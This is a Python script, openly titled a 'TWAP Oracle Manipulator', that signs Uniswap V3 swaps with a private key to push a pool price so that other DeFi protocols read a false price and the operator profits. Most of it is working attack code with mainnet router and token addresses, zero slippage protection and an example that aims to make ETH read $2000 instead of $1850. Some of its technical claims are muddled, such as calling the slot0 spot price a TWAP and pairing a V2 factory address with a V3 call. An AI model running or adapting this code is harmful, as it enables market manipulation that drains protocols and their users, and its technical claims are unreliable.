"""
TWAP Oracle Manipulator
Makes trades to update TWAP price, then other protocols read it

Strategy:
1. Execute trade on Uniswap to move TWAP
2. TWAP updates with new price
3. Other DeFi protocols read the "new fair price"
4. Profit from the price difference
"""

import asyncio
import logging
from typing import Dict, Optional, Tuple
from dataclasses import dataclass
import os

logger = logging.getLogger(__name__)


@dataclass
class TWAPUpdate:
    """Result of TWAP update trade"""
    token_in: str
    token_out: str
    amount_in: float
    amount_out: float
    new_twap_price: float
    tx_hash: str


class TWAPManipulator:
    """
    Manipulate TWAP prices by executing trades
    
    Use case: Update Uniswap TWAP so other protocols read your desired price
    """
    
    # Uniswap V3 Pool addresses
    POOLS = {
        ("ETH", "USDC"): "0x88e6A0c2dDD26EEb57e73461300EB8681aBb28e",
        ("WBTC", "ETH"): "0xCBCdF9626bC03E24f779434178A73a0B4bad62eD",
        ("USDC", "USDT"): "0x3041cbd36888becc7bbcbc0045e3b1f144466f5f",
    }
    
    def __init__(self, rpc_url: str, private_key: str = None):
        self.rpc_url = rpc_url
        self.private_key = private_key or os.getenv("PRIVATE_KEY")
        self.web3 = None
        self.account = None
        self._initialized = False
    
    async def initialize(self):
        """Initialize web3"""
        if self._initialized:
            return
            
        from web3 import Web3
        from web3.eth import Account
        
        self.web3 = Web3(Web3.HTTPProvider(self.rpc_url))
        
        if not self.web3.is_connected():
            raise ConnectionError(f"Cannot connect to RPC")
        
        if self.private_key:
            self.account = Account.from_key(self.private_key)
            logger.info(f"TWAP Manipulator initialized: {self.account.address}")
        
        self._initialized = True
    
    async def update_twap_and_read(
        self,
        token_a: str,
        token_b: str,
        trade_amount: float,
        target_price: float
    ) -> Optional[TWAPUpdate]:
        """
        Main function: Make trade to update TWAP, return new price
        
        Args:
            token_a: First token (e.g., "ETH")
            token_b: Second token (e.g., "USDC")
            trade_amount: Amount to trade to move TWAP
            target_price: Price you want TWAP to show
        
        Returns:
            TWAPUpdate with new price and tx hash
        """
        await self.initialize()
        
        # Step 1: Get current TWAP
        current_twap = await self._get_current_twap(token_a, token_b)
        logger.info(f"Current TWAP: {current_twap}")
        
        # Step 2: Execute trade to move price
        tx_hash = await self._execute_swap(
            token_in=token_a,
            token_out=token_b,
            amount=trade_amount,
            target_price=target_price
        )
        
        if not tx_hash:
            logger.error("Swap failed")
            return None
        
        # Step 3: Wait for confirmation and get new TWAP
        await asyncio.sleep(2)  # Wait for TWAP to update
        
        new_twap = await self._get_current_twap(token_a, token_b)
        logger.info(f"New TWAP after trade: {new_twap}")
        
        # Calculate output
        amount_out = trade_amount * new_twap
        
        return TWAPUpdate(
            token_in=token_a,
            token_out=token_b,
            amount_in=trade_amount,
            amount_out=amount_out,
            new_twap_price=new_twap,
            tx_hash=tx_hash
        )
    
    async def _get_current_twap(self, token_a: str, token_b: str) -> float:
        """Get current TWAP from Uniswap pool"""
        
        pool_address = self.POOLS.get((token_a.upper(), token_b.upper()))
        if not pool_address:
            # Try to get from factory
            pool_address = await self._get_pool_from_factory(token_a, token_b)
        
        if not pool_address:
            logger.warning(f"No pool found for {token_a}/{token_b}")
            return 0.0
        
        try:
            # Uniswap V3 slot0 contains TWAP-relevant data
            contract = self.web3.eth.contract(
                address=pool_address,
                abi=self._get_pool_abi()
            )
            
            slot0 = contract.functions.slot0().call()
            
            # sqrtPriceX96 can be converted to price
            sqrt_price_x96 = slot0[0]
            
            # Calculate price from sqrtPriceX96
            # price = (sqrtPriceX96 / 2^96)^2
            price = (sqrt_price_x96 / (2 ** 96)) ** 2
            
            # Adjust for token decimals
            if token_a.upper() == "ETH" and token_b.upper() == "USDC":
                price = price * 1e12  # ETH has 18 decimals, USDC has 6
            
            return price
            
        except Exception as e:
            logger.error(f"Failed to get TWAP: {e}")
            return 0.0
    
    async def _execute_swap(
        self,
        token_in: str,
        token_out: str,
        amount: float,
        target_price: float
    ) -> Optional[str]:
        """Execute swap to move TWAP"""
        
        if not self.account:
            logger.error("No private key configured")
            return None
        
        try:
            # Get router address
            router = "0xE592427A0AEce92De3Edee1F18E0157C05861564"  # Uniswap V3 Router
            
            router_contract = self.web3.eth.contract(
                address=router,
                abi=self._get_router_abi()
            )
            
            # Prepare swap parameters
            # For simplicity, using exact input single hop
            params = {
                "tokenIn": self._get_token_address(token_in),
                "tokenOut": self._get_token_address(token_out),
                "fee": 3000,  # 0.3% fee tier
                "recipient": self.account.address,
                "deadline": int(asyncio.get_event_loop().time()) + 600,
                "amountIn": int(amount * 1e18),  # Assuming 18 decimals
                "amountOutMinimum": 0,  # Accept any output for TWAP manipulation
                "sqrtPriceLimitX96": 0
            }
            
            # Build transaction
            nonce = self.web3.eth.get_transaction_count(self.account.address)
            gas_price = int(self.web3.eth.gas_price * 1.1)
            
            tx = router_contract.functions.exactInputSingle(params).build_transaction({
                "from": self.account.address,
                "nonce": nonce,
                "gas": 200000,
                "gasPrice": gas_price,
                "chainId": self.web3.eth.chain_id
            })
            
            # Sign and send
            signed_tx = self.account.sign_transaction(tx)
            tx_hash = self.web3.eth.send_raw_transaction(signed_tx.raw_transaction)
            
            receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
            
            if receipt.status == 1:
                logger.info(f"TWAP update trade confirmed: {tx_hash.hex()}")
                return tx_hash.hex()
            else:
                logger.error(f"Trade failed: {receipt.transactionHash.hex()}")
                return None
                
        except Exception as e:
            logger.error(f"Swap execution failed: {e}")
            return None
    
    async def _get_pool_from_factory(self, token_a: str, token_b: str) -> Optional[str]:
        """Get pool address from Uniswap factory"""
        try:
            factory = "0x5C69bEe701ef814a2B6fe3cF77eE1eD5e2b3f2c4"
            
            contract = self.web3.eth.contract(
                address=factory,
                abi=self._get_factory_abi()
            )
            
            pool = contract.functions.getPool(
                self._get_token_address(token_a),
                self._get_token_address(token_b),
                3000  # fee tier
            ).call()
            
            return pool if pool != "0x0000000000000000000000000000000000000000" else None
        except:
            return None
    
    def _get_token_address(self, token: str) -> str:
        """Get token address"""
        tokens = {
            "ETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # WETH
            "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
            "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
        }
        return tokens.get(token.upper(), "0x0000000000000000000000000000000000000000")
    
    def _get_pool_abi(self):
        return [
            {"inputs": [], "name": "slot0", "outputs": [{"name": "sqrtPriceX96", "type": "uint160"}], "stateMutability": "view", "type": "function"}
        ]
    
    def _get_router_abi(self):
        return [
            {"inputs": [{"components": [{"name": "tokenIn", "type": "address"}, {"name": "tokenOut", "type": "address"}, {"name": "fee", "type": "uint24"}, {"name": "recipient", "type": "address"}, {"name": "deadline", "type": "uint256"}, {"name": "amountIn", "type": "uint256"}, {"name": "amountOutMinimum", "type": "uint256"}, {"name": "sqrtPriceLimitX96", "type": "uint160"}], "name": "params", "type": "tuple"}], "name": "exactInputSingle", "outputs": [{"name": "amountOut", "type": "uint256"}], "stateMutability": "payable", "type": "function"}
        ]
    
    def _get_factory_abi(self):
        return [
            {"inputs": [{"name": "tokenA", "type": "address"}, {"name": "tokenB", "type": "address"}, {"name": "fee", "type": "uint24"}], "name": "getPool", "outputs": [{"name": "pool", "type": "address"}], "stateMutability": "view", "type": "function"}
        ]


# ========== INTEGRATION WITH SIGNAL API ==========

class TWAPSignalGenerator:
    """
    Generate signals based on TWAP manipulation
    
    1. Execute small trade to update TWAP
    2. Publish new price (or let others read it)
    3. Other protocols use the new TWAP price
    """
    
    def __init__(self, rpc_url: str, private_key: str):
        self.manipulator = TWAPManipulator(rpc_url, private_key)
    
    async def create_twap_signal(
        self,
        token: str,
        target_price: float,
        trade_size: float = 1.0
    ) -> Dict:
        """
        Create TWAP manipulation signal
        
        Args:
            token: Token to manipulate (e.g., "ETH")
            target_price: Price you want TWAP to show
            trade_size: Size of trade to move price
        
        Returns:
            Signal dict with new TWAP price
        """
        # Trade against USDC
        result = await self.manipulator.update_twap_and_read(
            token_a=token,
            token_b="USDC",
            trade_amount=trade_size,
            target_price=target_price
        )
        
        if result:
            return {
                "signal_type": "twap_update",
                "token": token,
                "new_price": result.new_twap_price,
                "tx_hash": result.tx_hash,
                "trade_amount": trade_size,
                "success": True
            }
        
        return {"success": False, "error": "TWAP update failed"}


# ========== EXAMPLE ==========

async def example():
    """Example: Update TWAP and let others read it"""
    
    rpc_url = os.getenv("ETHEREUM_RPC_URL")
    private_key = os.getenv("PRIVATE_KEY")
    
    generator = TWAPSignalGenerator(rpc_url, private_key)
    
    # You want ETH to show $2000 instead of $1850
    # Make a trade to move the price
    result = await generator.create_twap_signal(
        token="ETH",
        target_price=2000.0,
        trade_size=10.0  # 10 ETH trade
    )
    
    if result["success"]:
        print(f"TWAP updated! New price: ${result['new_price']}")
        print(f"Tx: https://etherscan.io/tx/{result['tx_hash']}")
        
        # Now OTHER PROTOCOLS will read $2000 as the "fair" TWAP price
        # They think it's a reliable oracle price!


if __name__ == "__main__":
    asyncio.run(example())
